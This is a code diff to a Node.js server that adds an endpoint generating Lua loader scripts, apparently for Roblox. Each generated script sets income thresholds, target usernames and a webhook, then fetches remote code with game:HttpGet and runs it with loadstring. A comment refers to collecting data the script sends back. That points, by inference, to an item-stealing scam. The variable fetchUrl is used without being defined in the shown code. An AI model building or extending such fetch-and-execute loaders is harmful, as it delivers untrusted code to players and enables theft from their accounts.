@@ -25,6 +25,12 @@ const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 const WEBHOOK_URL = process.env.WEBHOOK_URL;
 
 const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
+function generateScriptId() {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let id = '';
+    for (let i = 0; i < 8; i++) id += chars.charAt(Math.floor(Math.random() * chars.length));
+    return id;
+}
 
 // --- CONNEXION DB ---
 mongoose.connect(MONGO_URI)
@@ -51,6 +57,60 @@ if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);
 
 app.get('/api/admin/verify', (req, res) => {
     res.json({ success: req.query.token === ADMIN_TOKEN });
+});
+
+app.post('/api/create-script', async (req, res) => {
+    try {
+        // Auth check if ADMIN_TOKEN is set
+        if (ADMIN_TOKEN) {
+            const tokenQuery = req.query.token;
+            const tokenHeader = req.headers['x-admin-token'];
+            if (tokenQuery !== ADMIN_TOKEN && tokenHeader !== ADMIN_TOKEN) {
+                return res.status(403).json({ success: false, message: 'Forbidden' });
+            }
+        }
+
+        const body = req.body || {};
+        const minIncome = Number(body.minIncome) || 10000000;
+        const maxItems = Number(body.maxItems) || 10;
+        const targetsRaw = body.targets || ["MagixSafe", "M4GIX_TAB01", "M4GIX_TAB02", "TeCu71710"];
+        const webhookUrlRaw = body.webhookurl || '';
+        const visualRaw = body.visual || '';
+
+        // normalize targets to array of strings
+        let targetsArray = [];
+        if (Array.isArray(targetsRaw)) targetsArray = targetsRaw.map(t => String(t));
+        else if (typeof targetsRaw === 'string') {
+            targetsArray = targetsRaw.split(',').map(s => s.trim()).filter(s => s.length > 0);
+        }
+
+        const luaTargets = targetsArray.length > 0 ? targetsArray.map(t => `"${t.replace(/"/g, '\\"')}"`).join(', ') : '';
+        const scriptId = generateScriptId();
+
+        // build Lua loader script
+        const lua = [
+            `local fenv = getfenv()`,
+            `local var0 = setmetatable({}, {`,
+            `\t["__index"] = {},`,
+            `})`,
+            ``,
+            `fenv["MinIncome"] = ${minIncome}`,
+            `fenv["MaxItems"] = ${maxItems}`,
+            `fenv["Targets"] = { ${luaTargets} }`,
+            `fenv["Visual"] = ${visualRaw === "" ? '""' : '"' + String(visualRaw).replace(/"/g, '\\"') + '"'}`,
+            `fenv["ScriptId"] = "${scriptId}"`,
+            ``,
+            `local var1 = game:HttpGet("${fetchUrl.replace(/"/g, '\\"')}")`,
+            `local var2 = loadstring(var1)`,
+            `local var3 = var2()`
+        ].join('\n');
+
+        // Ne pas enregistrer en base pour l'instant — juste retourner le script
+        return res.status(201).json({ success: true, data: { ScriptId: scriptId, Script: lua } });
+    } catch (err) {
+        log(`❌ [API] POST /api/create-script error: ${err && err.message ? err.message : err}`);
+        return res.status(500).json({ success: false, message: 'Internal server error' });
+    }
 });
 
 // Route pour recevoir et persister les données envoyées par le script Lua
